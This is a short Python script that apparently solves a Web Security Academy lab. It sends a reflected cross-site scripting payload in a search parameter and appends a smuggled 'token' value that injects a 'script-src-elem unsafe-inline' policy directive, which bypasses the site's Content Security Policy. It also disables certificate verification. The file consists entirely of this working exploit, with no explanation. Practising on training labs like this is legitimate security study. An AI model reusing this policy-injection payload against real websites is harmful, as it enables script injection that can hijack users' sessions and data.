#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a9700ba049c65728084c66c00cf00f4.web-security-academy.net'

payload = "<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'"
response = requests.get(
    url + "/?search=" + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)